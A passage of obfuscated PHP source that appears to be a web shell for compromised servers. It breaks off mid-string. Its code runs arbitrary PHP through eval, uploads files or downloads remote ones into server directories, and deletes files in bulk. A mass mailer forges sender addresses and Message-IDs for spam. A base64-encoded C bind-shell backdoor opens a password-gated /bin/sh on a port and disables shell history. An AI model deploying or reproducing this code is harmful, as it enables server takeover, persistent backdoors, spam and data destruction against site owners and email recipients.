        "\r\n") . z5q() . z9z() . z5z("left", "3") . z8b(z9y("183"), '7', '9') . z5u("eval_txt",
        z9y("184"), "eval_txt") . z5h()))) . z5b(), '2');
    if (@isset($evalsubmit) && $evalsubmit) {
        $eval = @isset($eval) ? $eval : "";
        if (!@empty($eval)) {
            $eval_result = "";
            $tmp = @ob_get_contents();
            $olddir = @realpath(".") || @getcwd();
            @chdir($d);
            if ($tmp) {
                @ob_clean();
                eval($eval);
                $ret = @ob_get_contents();
                $ret = @convert_cyr_string($ret, "d", "w");
                @ob_clean();
                echo $tmp;
                if ($eval_txt) {
                    $eval_result = @htmlspecialchars($ret);
                } else {
                    $eval_result = $ret;
                }
            } else {
                if ($eval_txt) {
                    $eval_result = @eval($eval);
                } else {
                    $eval_result = $ret;
                }
            }
            @chdir($olddir);
        }
        if ($eval_txt) {
            echo z10w(z7u(z6l(z5w('', '1', 1) . (@isset($eval_result) ? $eval_result : '') .
                z5q())) . z5b(), '2');
        } else {
            echo $eval_result;
        }
    }
}
if ($act == 'upload') {
    if (z0n($d)) {
        $wdt = (($use_images) ?
            '<img alt="+" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=ok">' :
            z5p("+"));
    } else {
        $wdt = (($use_images) ?
            '<img alt="x" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=cancel">' :
            z8k("x"));
    }
    $a_get = array();
    $ls_a = array();
    $umsg = $mmsg = $rmsg = '';
    if (!@isset($multiupload)) {
        if (@isset($usubmit) && $usubmit) {
            global $_FILES;
            $dest = '';
            if (!@empty($_FILES['file1']['tmp_name'])) {
                $dest = $_FILES['file1']['name'];
            }
            if (@isset($rfile1) && !@empty($rfile1)) {
                $dest = $rfile1;
            }
            if (!@isset($path1) || @empty($path1))
                $path1 = $d;
            $path1 = z1k($path1);
            if (!@empty($dest)) {
                if (!@move_uploaded_file($_FILES['file1']['tmp_name'], $path1 . $dest)) {
                    $umsg = z9y("172", array($_FILES['file1']['name'], $_FILES['file1']['tmp_name'],
                            $path1 . $dest));
                } else {
                    $umsg = z9y("173", array($_FILES['file1']['name'], $path1 . $dest));
                    $ls_a[] = $path1 . $dest;
                    $nolsmenu = 1;
                    $act = "ls";
                    $d = $path1;
                }
                $umsg = z10w(z7u(z9c($umsg)));
            }
        }
        echo z3q(z9y("161")) . $umsg . z10w(z5b() . z9d(z9c(z5n(array('act' => 'upload',
                'd', 'usubmit' => '1'), z10w(z7u(z5t(z9y("162")) . z9c(z9g('file1', '2') . z8b(z9y
            ("170"), '7') . $wdt)) . z7u(z5t(z9y("163")) . z9c(z6u('rfile1', (@isset($rfile1) ?
            $rfile1 : ''), "9"))) . z7u(z5t(z9y("164")) . z9c(z6u('path1', (@isset($path1) ?
            $path1 : $d), "9")))))) . z9c(z5x(array('act' => 'upload', 'd', 'multiupload' =>
                '1'), z10w(z7u(z9c(z7n(z9y("166")) . z6u('lno', ((@isset($lno)) ? $lno : '10'),
            '1') . z8b(z9y("169"), '7'))))))) . z5b(), '2');
    } else {
        if (@isset($msubmit) && $msubmit) {
            global $_FILES;
            foreach ($_FILES as $fk => $fv) {
                $dest = '';
                if (!@empty($_FILES[$fk]['tmp_name'])) {
                    $dest = $_FILES[$fk]['name'];
                }
                if (@isset($rfile[$fk]) && !@empty($rfile[$fk])) {
                    $dest = $rfile[$fk];
                }
                if (!@isset($mpath) || @empty($mpath))
                    $mpath = $d;
                $mpath = z1k($mpath);
                if (!@empty($dest)) {
                    if (!@move_uploaded_file($_FILES[$fk]['tmp_name'], $mpath . $dest)) {
                        $mmsg .= z9y("172", array($_FILES[$fk]['name'], $_FILES[$fk]['tmp_name'], $mpath .
                                $dest)) . z9z();
                    } else {
                        $mmsg .= z9y("173", array($_FILES[$fk]['name'], $mpath . $dest)) . z9z();
                        $ls_a[] = $mpath . $dest;
                        $nolsmenu = 1;
                        $act = "ls";
                        $ftarget = '1';
                        $d = $mpath;
                    }
                }
            }
            if ($mmsg != '')
                $mmsg = z10w(z7u(z9c($mmsg)));
        }
        $form = '';
        if (!@is_numeric($lno))
            $lno = 10;
        for ($i = 0; $i < $lno; $i++) {
            $ii = ($i + 1);
            $form .= z7u(z5t(z9y("162") . " " . $ii) . z9c(z9g('file' . $ii, '2')) . z5t(z9y
                ("163")) . z9c(z6u('rfile[file' . $ii . ']', '', "0")));
        }
        echo z3q(z9y("168")) . $mmsg . z5n(array('act' => 'upload', 'd', 'multiupload' =>
                '1', 'lno', 'msubmit' => '1'), z10w(z5b() . $form) . z10w(z5b() . z7u(z5t(z9y("164")) .
            z9c(z6u('mpath', (@isset($mpath) ? $mpath : $d), "9") . z8b(z9y("170"), '7') . $wdt)) .
            z5b()));
    }
    if ($bcurl)
        $a_get['phpcurl'] = "use php->curl";
    if ($bfsock)
        $a_get['fsock'] = "use php->fsockopen";
    if (z7e('ini_get') && z8d('allow_url_fopen') && z7e('file_get_contents'))
        $a_get['file_get_contents'] = "use php->file_get_contents";
    if ($nix && $sh_exec) {
        foreach ($getaliases as $k => $v) {
            if (z8t($k))
                $a_get[$k] = "use cmd->$k";
        }
    }
    if (@count($a_get) > 0) {
        if (@isset($rsubmit) && $rsubmit) {
            $fct = '';
            if (!@preg_match(":^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&%\$\-]+)*@)?((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.[a-zA-Z]{2,4})(\:[0-9]+)?(/[^/][a-zA-Z0-9\.\,\?\'\\/\+&%\$#\=~_\-@]*)*$:i",
                $uploadurl)) {
                $rmsg = z9y("171", $uploadurl);
            } else {
                $dest = z2l($uploadurl);
                if (@isset($nameurl) && !@empty($nameurl))
                    $dest = $nameurl;
                if (@empty($dest))
                    $dest = 'index.html';
                if (!@isset($rpath) || @empty($rpath))
                    $rpath = $d;
                $rpath = z1k($rpath);
                if (z4r($rpath . $dest)) {
                    $i = 1;
                    while (z4r($rpath . $dest)) {
                        if ($i == 1) {
                            $dest = $dest . "." . $i;
                        } else {
                            $dest = @substr($dest, 0, @strlen($dest) - 2) . "." . $i;
                        }
                        $i++;
                    }
                }
                if ($upwith == 'phpcurl' || $upwith == 'fsock' || $upwith == 'file_get_contents') {
                    if ($upwith == 'phpcurl')
                        $fct = z3t($uploadurl);
                    if ($upwith == 'fsock')
                        $fct = z2h($uploadurl);
                    if ($upwith == 'file_get_contents')
                        $fct = @file_get_contents($uploadurl);
                    if (!$fct || @empty($fct)) {
                        $rmsg = z9y("174");
                    } else {
                        if (z9t($rpath . $dest, $fct)) {
                            $rmsg = z9y("176", $rpath . $dest);
                            $ls_a[] = $rpath . $dest;
                            $nolsmenu = 1;
                            $act = "ls";
                            $d = $rpath;
                        } else {
                            $rmsg = z9y("175", $rpath . $dest);
                        }
                    }
                } else {
                    if ($nix && $sh_exec && @isset($getaliases[$upwith])) {
                        $ucmd = @str_replace('[%1%]', $upwith, $getaliases[$upwith]);
                        $ucmd = @str_replace('[%2%]', $uploadurl, $ucmd);
                        $ucmd = @str_replace('[%3%]', $rpath . $dest, $ucmd);
                        z9e($ucmd, 1);
                        if (z4r($rpath . $dest)) {
                            $rmsg = z9y("176", $rpath . $dest);
                            $ls_a[] = $rpath . $dest;
                            $nolsmenu = 1;
                            $act = "ls";
                            $d = $rpath;
                        } else {
                            $rmsg = z9y("174");
                        }
                    }
                }
            }
            if ($rmsg != '')
                $rmsg = z10w(z7u(z9c($rmsg)));
        }
        echo z3q(z9y("167")) . $rmsg . z5x(array('act' => 'upload', 'd', 'rsubmit' =>
                '1'), z10w(z5b() . z7u(z5t(z9y("165")) . z9c(z6u('uploadurl', (@isset($uploadurl) ?
            $uploadurl : 'http://'), "0") . z3m('upwith', $a_get, '4', '1') . z8b(z9y("170"),
            '7') . $wdt)) . z7u(z5t(z9y("163")) . z9c(z6u('nameurl', (@isset($nameurl) ? $nameurl :
            ''), "9"))) . z7u(z5t(z9y("164")) . z9c(z6u('rpath', (@isset($rpath) ? $rpath :
            $d), "9"))) . z5b(), '2'));
    }
}
if (@isset($lsall) && @isset($action) && $action != '') {
    $lsall_arr = array();
    $tlsall_arr = @explode("\n", $lsall);
    foreach ($tlsall_arr as $tls) {
        $tls = @trim($tls);
        if (!@empty($tls) && !@in_array($tls, $lsall_arr)) {
            $lsall_arr[] = $tls;
        }
    }
    if (@count($lsall_arr) > 0) {
        foreach ($lsall_arr as $dfls) {
            if (@isset($use_buffer) && $use_buffer && @isset($bcopy) && @isset($bcut) && @
                is_array($bcopy) && @is_array($bcut)) {
                switch ($action) {
                    case 'bcopy':
                        if (!@in_array($dfls, $bcopy)) {
                            z1o($dfls, 'bcopy');
                        }
                        break;
                    case 'bcut':
                        if (!@in_array($dfls, $bcut)) {
                            z1o($dfls, 'bcut');
                        }
                        break;
                    case 'bunsetcopy':
                        if (@in_array($dfls, $bcopy)) {
                            z1o($dfls, 'bcopy');
                        }
                        break;
                    case 'bunsetcut':
                        if (@in_array($dfls, $bcut)) {
                            z1o($dfls, 'bcut');
                        }
                        break;
                    case 'bunsetall':
                        if (@in_array($dfls, $bcopy)) {
                            z1o($dfls, 'bcopy');
                        } elseif (@in_array($dfls, $bcut)) {
                            z1o($dfls, 'bcut');
                        }
                        break;
                    default:
                        break;
                }
            }
            switch ($action) {
                case 'delete':
                    if (z4r($dfls)) {
                        z8s($dfls);
                    }
                    break;
                default:
                    break;
            }
        }
        if (@isset($use_buffer) && $use_buffer)
            z0j();
    }
}
if ($act == 'mailer') {
    $smsg = $cmsg = '';
    $s_ok = $c_ok = 0;
    if (@isset($m1_submit) && $m1_submit) {
        if (@empty($m1_name) || @empty($m1_from) || @empty($m1_subj) || @empty($m1_msg) ||
            $m1_msg == "message" || @empty($m1_emails) || !@strstr($m1_emails, "@")) {
            $smsg = " : " . z9y("236");
        } else {
            $s_ok = 1;
        }
    } elseif (@isset($m2_submit) && $m2_submit) {
        if (@empty($m2_name) || @empty($m2_from) || @empty($m2_subj) || @empty($m2_msg) ||
            @empty($m2_csv) || !@preg_match('/"(.*?)"\s*,\s*"(.*?)"/', $m2_csv)) {
            $cmsg = " : " . z9y("236");
        } else {
            $c_ok = 1;
        }
    }
    if (!@isset($m1_msg) || @empty($m1_msg))
        $m1_msg = "message";
    if (!@isset($m1_emails) || @empty($m1_emails))
        $m1_emails = "e-mails";
    if (!@isset($m2_prefix) || @empty($m2_prefix))
        $m2_prefix = "column_prefix_";
    if (!@isset($m2_ecol) || !@is_numeric($m2_ecol))
        $m2_ecol = "0";
    if (!@isset($m2_msg) || @empty($m2_msg))
        $m2_msg = "Hello " . $m2_prefix . "1,\r\n\r\nYour Address: " . $m2_prefix . "2\r\nYour Phone: " .
            $m2_prefix . "3\r\n\r\nE-mail sent to: " . $m2_prefix . "0";
    if (!@isset($m2_csv) || @empty($m2_csv))
        $m2_csv = '"john@email","john","john\'s address","0123456789"' . "\r\n" .
            '"jane@email","jane","jane\'s address","9876543210"';
    echo z3q(array(z9y("212") . $smsg, z9y("213") . $cmsg), '46');
    echo z9m('2') . z7o() . z7j('', '4');
    echo z10w(z5b() . z9d(z9c(z10w(z5x(array("act" => "mailer", "d", "m1_submit" =>
            "1"), z7u(z9c(z7n(z9y("214"))) . z6z(z5y('m1_name', '', '7'))) . z7u(z9c(z7n(z9y
        ("215"))) . z6z(z5y('m1_from', '', '7'))) . z7u(z9c(z7n(z9y("216"))) . z6z(z5y('m1_subj',
        '', '7'))) . z7u(z6x(z5w('m1_msg', '3') . $m1_msg . z5q(), '2')) . z7u(z6x(z5w('m1_emails',
        '3') . $m1_emails . z5q(), '2')) . z7u(z6x(z10w(z7u(z9c(z7n(z9y("217")) . z5y('m1_str',
        '', '4')) . z9c(z7n(z9y("218")) . z3m('m1_replace', array("" => z9y("223"),
            "name" => z9y("224"), "email1" => z9y("225"), "email2" => z9y("226"),
            "emailhash" => z9y("227")), '4', 1)) . z9c(z7n(z9y("219")) . z3m("m1_where",
        array("subject" => z9y("228"), "message" => z9y("229"), "" => z9y("230")), '5',
        1))), '2'), '2')) . z7u(z6x(z10w(z7u(z9c(z5u("m1_rand1", z9y("231"), "m1_rand1"),
        '', '4') . z9c(z5u("m1_rand2", z9y("232"), "m1_rand2"), '', '4')), '2'), '2')) .
        z5b() . z7u(z6x(z8b(z9y("233"), '7') . z5u('m1_preview', z9y("234"),
        'm1_preview'), '2'))), '2'), '20')) . z5b(), '2');
    echo z7f() . z7j('', '46');
    echo z10w(z5b() . z9d(z9c(z10w(z5x(array('act' => 'mailer', "d", 'm2_submit' =>
            '1'), z7u(z9c(z7n(z9y("214"))) . z6z(z5y('m2_name', '', '7'))) . z7u(z9c(z7n(z9y
        ("215"))) . z6z(z5y('m2_from', '', '7'))) . z7u(z9c(z7n(z9y("216"))) . z6z(z5y('m2_subj',
        '', '7'))) . z7u(z6x(z5w('m2_msg', '3') . $m2_msg . z5q(), '2')) . z7u(z6x(z5w('m2_csv',
        '3') . $m2_csv . z5q(), '2')) . z7u(z6x(z10w(z7u(z9c(z7n(z9y("220")) . z6u('m2_ecol',
        $m2_ecol, '6')) . z9c(z7n(z9y("221")) . z5y('m2_prefix', '', '4')) . z9c(z7n(z9y
        ("222")) . z3m('m2_where', array("message" => z9y("229"), "" => z9y("230")), "4",
        1))), '2'), '2')) . z7u(z6x(z10w(z7u(z9c(z5u("m2_rand1", z9y("231"), "m2_rand1"),
        '', '4') . z9c(z5u("m2_rand2", z9y("232"), "m2_rand2"), '', '4')), '2'), '2')) .
        z5b() . z7u(z6x(z8b(z9y("233"), '7') . z5u('m2_preview', z9y("234"),
        "m2_preview") . ' ' . z5u('m2_verbose', z9y("235"), "m2_verbose"), '2'))), '2'),
        '20')) . z5b(), '2');
    echo z7f() . z7y() . z10q();
    if ($s_ok || $c_ok) {
        $host = array("aol.com", "att.net", "bellsouth.net", "comcast.net", "email.com",
                "gmail.com", "googlemail.com", "hotmail.com", "juno.com", "live.com",
                "lycos.com", "mail.com", "mindspring.com", "msn.com", "pacbell.com", "post.com",
                "prodigy.net", "rocketmail.com", "sbcglobal.net", "usa.com", "yahoo.com",
                "ymail.com");
        $ch = (@count($host) - 1);
        $i = 1;
        $m_success = 0;
        $m_failed = 0;
        $all_failed = array();
        if ($s_ok) {
            echo z9m('2') . z7u(z9c(z9y("237"), '8', '2') . z9c(z9y("238"), '8') . z9c(z9y("239"),
                '8') . z9c(z9y("240"), '8') . z9c(z9y("241"), '8', '3'));
            $m_all = @explode("\n", $m1_emails);
            $m_all = @array_unique($m_all);
            $m_count = @count($m_all);
            $m_len = @strlen($m_count);
            z5o();
            foreach ($m_all as $m_mail) {
                $from = $m1_from;
                if (@isset($m1_rand1) && $m1_rand1) {
                    $from = @str_replace("@", @rand(100000, 999999) . "@", $from);
                }
                if (isset($m1_rand2) && $m1_rand2) {
                    $hr = @rand(0, $ch);
                    $m_msgid = @md5(@uniqid(@time())) . "@" . $host[$hr];
                } else {
                    $m_msgid = @md5(@uniqid(@time())) . "@" . $_SERVER["SERVER_NAME"];
                }
                $header = "";
                $header .= "From: $m1_name <$from>\n";
                $header .= "Reply-To: <$from>\n";
                $header .= "Message-ID: <" . $m_msgid . ">\n";
                $header .= "MIME-Version: 1.0\n";
                $date = @date("Y-m-d");
                $header .= "Date: $date\n";
                $header .= "Content-Type: text/html; charset=UTF-8\n";
                $header .= "Content-Transfer-Encoding: 8bit\n\n";
                $m_msg = $m1_msg;
                $m_subj = $m1_subj;
                if (@isset($m1_str) && !@empty($m1_str) && @isset($m1_replace) && !@empty($m1_replace)) {
                    if ($m1_replace == "name") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message")
                            $m_msg = @str_replace($m1_str, $m1_name, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject")
                            $m_subj = @str_replace($m1_str, $m1_name, $m_subj);
                    } elseif ($m1_replace == "email1") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message")
                            $m_msg = @str_replace($m1_str, $m1_from, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject")
                            $m_subj = @str_replace($m1_str, $m1_from, $m_subj);
                    } elseif ($m1_replace == "email2") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message")
                            $m_msg = @str_replace($m1_str, $m_mail, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject")
                            $m_subj = @str_replace($m1_str, $m_mail, $m_subj);
                    } elseif ($m1_replace == "emailhash") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message")
                            $m_msg = @str_replace($m1_str, @md5($m_mail), $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject")
                            $m_subj = @str_replace($m1_str, @md5($m_mail), $m_subj);
                    }
                }
                $m_pad = "";
                if (@strlen($i) < $m_len)
                    $m_pad = @str_repeat("0", ($m_len - @strlen($i)));
                if (!@empty($m_mail)) {
                    if (@isset($m1_preview) && $m1_preview) {
                        if ($i > 5)
                            break;
                        echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') .
                            z9c($m_msgid, '14') . z9c(z5p(z9y("245")), '14', '3'), ($i % 2 ? '0' : '1'));
                    } elseif (@mail($m_mail, $m_subj, $m_msg, $header)) {
                        echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') .
                            z9c($m_msgid, '14') . z9c(z5p(z9y("243")), '14', '3'), ($i % 2 ? '0' : '1'));
                        z5o();
                        $m_success++;
                    } else {
                        echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') .
                            z9c($m_msgid, '14') . z9c(z8k(z9y("244")), '14', '3'), ($i % 2 ? '0' : '1'));
                        z5o();
                        $all_failed[] = $m_mail;
                        $m_failed++;
                    }
                    $i++;
                }
            }
        } elseif ($c_ok) {
            $fcsv = @str_replace("\r", "\n", $m2_csv);
            $fcsv = z2v("\n\n", "\n", $fcsv);
            $csv = z5s($fcsv);
            echo z9m('2') . z7u(z9c(z9y("237"), '8', '2') . z9c(z9y("238"), '8') . z9c(z9y("239"),
                '8') . ((@isset($m2_verbose) && $m2_verbose) ? z9c(z9y("242"), '8') : '') . z9c
                (z9y("240"), '8') . z9c(z9y("241"), '8', '3'));
            $m_count = @count($csv);
            $m_len = @strlen($m_count);
            z5o();
            foreach ($csv as $str_csv) {
                if (@is_array($str_csv)) {
                    $from = $m2_from;
                    $m_mail = $str_csv[$m2_ecol];
                    if (@isset($m2_rand1) && $m2_rand1) {
                        $from = @str_replace("@", @rand(100000, 999999) . "@", $from);
                    }
                    if (isset($m2_rand2) && $m2_rand2) {
                        $hr = @rand(0, $ch);
                        $m_msgid = @md5(@uniqid(@time())) . "@" . $host[$hr];
                    } else {
                        $m_msgid = @md5(@uniqid(@time())) . "@" . $_SERVER["SERVER_NAME"];
                    }
                    $header = "";
                    $header .= "From: $m2_name <$from>\n";
                    $header .= "Reply-To: <$from>\n";
                    $header .= "Message-ID: <" . $m_msgid . ">\n";
                    $header .= "MIME-Version: 1.0\n";
                    $date = @date("Y-m-d");
                    $header .= "Date: $date\n";
                    $header .= "Content-Type: text/html; charset=UTF-8\n";
                    $header .= "Content-Transfer-Encoding: 8bit\n\n";
                    $m_msg = $m2_msg;
                    $m_subj = $m2_subj;
                    $repl = array();
                    for ($si = (@count($str_csv) - 1); $si >= 0; $si--) {
                        if (@empty($m2_where)) {
                            $m_msg = @str_replace($m2_prefix . $si, $str_csv[$si], $m_msg);
                            $m_subj = @str_replace($m2_prefix . $si, $str_csv[$si], $m_subj);
                            $repl[] = $m2_prefix . $si . " = " . $str_csv[$si] . z9z();
                        } else {
                            $m_msg = @str_replace($m2_prefix . $si, $str_csv[$si], $m_msg);
                            $repl[] = $m2_prefix . $si . " = " . $str_csv[$si] . z9z();
                        }
                    }
                    $replacing = (@count($repl) > 0 ? @implode('', @array_reverse($repl)) : '');
                    $m_pad = "";
                    if (@strlen($i) < $m_len)
                        $m_pad = @str_repeat("0", ($m_len - @strlen($i)));
                    if (!@empty($m_mail)) {
                        if (@isset($m2_preview) && $m2_preview) {
                            if ($i > 5)
                                break;
                            echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') . ((@
                                isset($m2_verbose) && $m2_verbose) ? z9c($replacing, '14') : '') . z9c($m_msgid,
                                '14') . z9c(z5p(z9y("245")), '14', '3'), ($i % 2 ? '0' : '1'));
                        } elseif (@mail($m_mail, $m_subj, $m_msg, $header)) {
                            echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') . ((@
                                isset($m2_verbose) && $m2_verbose) ? z9c($replacing, '14') : '') . z9c($m_msgid,
                                '14') . z9c(z5p(z9y("243")), '14', '3'), ($i % 2 ? '0' : '1'));
                            z5o();
                            $m_success++;
                        } else {
                            echo z9d(z9c($m_pad . $i, '14', '2') . z9c($m_mail, '14') . z9c($from, '14') . ((@
                                isset($m2_verbose) && $m2_verbose) ? z9c($replacing, '14') : '') . z9c($m_msgid,
                                '14') . z9c(z8k(z9y("244")), '14', '3'), ($i % 2 ? '0' : '1'));
                            z5o();
                            $all_failed[] = $m_mail;
                            $m_failed++;
                        }
                        $i++;
                    }
                }
            }
            echo z10q();
        }
        if (!@isset($m2_preview) || !$m2_preview) {
            echo z6s() . z10w(z7u(z6l(z9y("426", $m_count) . z9x() . z9y("427", $m_success) .
                z9x() . z9y("428", $m_failed) . ($m_failed > 0 ? z9x() . z9y("431") : ''))), '2');
            if (@count($all_failed) > 0) {
                echo z10w(z9d(z6l(z5w('', '1', 1) . @implode("\n", @array_unique($all_failed)) .
                    z5q())), '2');
            }
        }
    }
}
if ($act == 'encoders') {
    $hash_algos = array('' => z9y("260"));
    if (!@isset($hash_input))
        $hash_input = '';
    if (z7e("hash_algos") && @z7e("hash")) {
        $hfnc = 1;
        $hashes = @hash_algos();
    } else {
        $hfnc = 0;
        $hashes = array();
        foreach (array("md5", "sha1", "crc32") as $hh) {
            if (z7e($hh))
                $hashes[] = $hh;
        }
    }
    foreach ($hashes as $ha)
        $hash_algos[$ha] = $ha;
    $encode_functions = z1e();
    $submited = 0;
    if (@isset($submit_encode) && $submit_encode && @isset($encoder_input) && !@
        empty($encoder_input))
        $submited = 1;
    $encoder_output = "";
    if (!@isset($ip_input) || @empty($ip_input)) {
        $ip_input = $saddr;
    }
    echo z3q(array(z9y("246"), z9y("253")), "46");
    echo z9m(2) . z7o() . z7j('', '4') . z6s() . z9m('2') . z9k('', 'hash_form') .
        z9v("act", "encoders") . z9v("d") . z9v("htype", "1") . z7u(z5t(z9y("247")) .
        z9c(z5y("hashinput", "", "5") . z8b(z9y("248"), '7') . z8m(z9y("250"),
        'document.hash_form.hashinput.value=\'\';', '7'))) . z9l() . z10q();
    if (@isset($htype) && $htype) {
        echo z10w(z9d(z5t(z9y("251")) . z9c(z5w('', '6') . z2e($hashinput) . z5q())),
            "2");
    }
    echo z7f() . z7j('', '46') . z6s() . z9m('2') . z9k('', "ip_form") . z9v("act",
        "encoders") . z9v("d") . z9v("submit_ip", "1") . z7u(z5t(z9y("254")) . z9c(z6u("ip_input",
        @htmlspecialchars($ip_input), '5') . z8b(z9y("248"), '7') . z8m(z9y("250"),
        'document.ip_form.ip_input.value=\'\';', '7'))) . z9l() . z10q();
    if (@isset($submit_ip) && $submit_ip == "1" && @isset($ip_input) && !@empty($ip_input)) {
        echo z9m('2') . z7u(z5t(z9y("255")) . z9c(z8g(sprintf("%u", @ip2long($ip_input)),
            "0") . z9x() . z10t('http://' . @sprintf("%u", @ip2long($ip_input)) . '/', z9y("252"),
            "1", 1))) . z7u(z5t(z9y("256")) . z9c(z8g((z2z($ip_input) == "failed") ?
            "failed" : z2z($ip_input), "0") . ((z2z($ip_input) == "failed") ? "" : z9x() .
            z10t('http://' . z2z($ip_input) . '/', z9y("252"), "1", 1)))) . z7u(z5t(z9y("257")) .
            z9c(z8g((z1u($ip_input) == "failed") ? "failed" : z1u($ip_input), "0") . ((z1u($ip_input) ==
            "failed") ? "" : z9x() . z10t('http://' . z1u($ip_input) . '/', z9y("252"), "1",
            1)))) . z10q();
    }
    echo z6s();
    echo z7f() . z7y() . z10q();
    echo z3q(array(z9y("432"), z9y("433")), '46');
    echo z9m(2) . z7o() . z7j('', '4') . z6s() . z9m('2') . z9k('', "hashing_form") .
        z9v("act", "encoders") . z9v("d") . z7u(z5t(z9y("258")) . z9c(z3m('hash_type', $hash_algos,
        '5', 1) . z8b(z9y("249"), '7') . z8m(z9y("250"),
        'document.hashing_form.hash_input.value=\'\';', '7'))) . z9d(z5t(z9y("259")) .
        z9c(z5w('hash_input', '6') . (@isset($hash_input) ? @htmlspecialchars($hash_input) :
        '') . z5q())) . z9l() . z10q() . z6s() . z7f() . z7j('', '46') . z6s() . z9m('2') .
        z9k('', "encoder_form") . z9v("d") . z9v("act", "encoders") . z9v("submit_encode",
        "1") . z7u(z5t(z9y("91")) . z9c(z3m("encode_selected", $encode_functions, "5", 1,
        '') . z8b(z9y("249"), '7') . z8m(z9y("250"),
        'document.encoder_form.encoder_input.value=\'\';', '7'))) . z9d(z5t(z9y("259")) .
        z9c(z5w('encoder_input', '6') . (@isset($encoder_input) ? @htmlspecialchars($encoder_input) :
        '') . z5q())) . ($submited ? z7u(z5t(z9x()) . z9c(z8m(z9y("263"),
        'document.output_form.encoder_output.value=\'\';', '7') . z8m(z9y("264"),
        'document.encoder_form.encoder_input.value=document.output_form.encoder_output.value;',
        '7'))) : '') . z9l() . z10q() . z6s() . z7f() . z7y() . z10q();
    if (@isset($hash_input) && !@empty($hash_input)) {
        echo z3q(z9y("261")) . z6s();
        echo z9m('2');
        if (@count($hashes) > 0) {
            if (@isset($hash_type) && @in_array($hash_type, $hashes)) {
                echo z7u(z5t($hash_type) . z9c(z8g(($hfnc ? @hash($hash_type, $hash_input) : $hash_type
                    ($hash_input)), '7')));
            } else {
                foreach ($hashes as $k) {
                    echo z7u(z5t($k) . z9c(z8g(($hfnc ? @hash($k, $hash_input) : $k($hash_input)),
                        '7')));
                }
            }
        }
        echo z10q() . z6s();
    }
    if ($submited) {
        $encoder_output = $encode_selected($encoder_input);
        echo z3q(z9y("262")) . z6s() . z9m('2') . z9k('', "output_form") . z9d(z6l(z5w('encoder_output',
            '1') . @htmlspecialchars($encoder_output) . z5q())) . z9l() . z10q() . z6s();
    }
}
if ($act == 'tools') {
    $bndprt_c = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5ncy5oPgojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CgojZGVmaW5lIFAwUlQgJXBvcnQlCiNkZWZpbmUgUEFTUyAiJXBhc3MlIgoKaW50Cm1haW4oaW50IGEsIGNoYXIgKipiKQp7CmludCBjLCBkLCBlID0gc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbiksIGY7CmNoYXIgcFsxMDAwXTsKc3RydWN0IHNvY2thZGRyX2luIGwsIHI7CnNpZ25hbChTSUdDSExELCBTSUdfSUdOKTsKc2lnbmFsKFNJR0hVUCwgU0lHX0lHTik7CnNpZ25hbChTSUdURVJNLCBTSUdfSUdOKTsKc2lnbmFsKFNJR0lOVCwgU0lHX0lHTik7CmlmIChmb3JrKCkpCmV4aXQoMCk7Cmwuc2luX2ZhbWlseSA9IEFGX0lORVQ7Cmwuc2luX3BvcnQgPSBodG9ucyhQMFJUKTsKbC5zaW5fYWRkci5zX2FkZHIgPSBJTkFERFJfQU5ZOwpiemVybygmKGwuc2luX3plcm8pLCA4KTsKYyA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7CmJpbmQoYywoc3RydWN0IHNvY2thZGRyICopICZsLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSk7Cmxpc3RlbihjLCAzKTsKd2hpbGUgKChkID0gYWNjZXB0KGMsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnIsICZlKSkpCnsKaWYgKCFmb3JrKCkpCnsKcmVjdihkLCBwLCAxMDAwLCAwKTsKaWYgKGNocGFzcyhQQVNTLHApKQp7CmNsb3NlKGQpOwpleGl0KDEpOwp9CmNsb3NlKDApOwpjbG9zZSgxKTsKY2xvc2UoMik7CmR1cDIoZCwgMCk7CmR1cDIoZCwgMSk7CmR1cDIoZCwgMik7CnNldGVudigiUEFUSCIsICIvc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbjovdXNyL2xvY2FsL2Jpbi86L3Vzci9sb2NhbC9zYmluOi4iLCAxKTsKdW5zZXRlbnYoIkhJU1RTQVZFIik7CnVuc2V0ZW52KCJISVNURklMRSIpOwpleGVjbCgiL2Jpbi9zaCIsICJzaCIsIChjaGFyICopIDApOwpjbG9zZShkKTsKZXhpdCgwKTsKfQp9CnJldHVybiAwOwp9CgppbnQgY2hwYXNzKGNoYXIgKmJhc2UsIGNoYXIgKm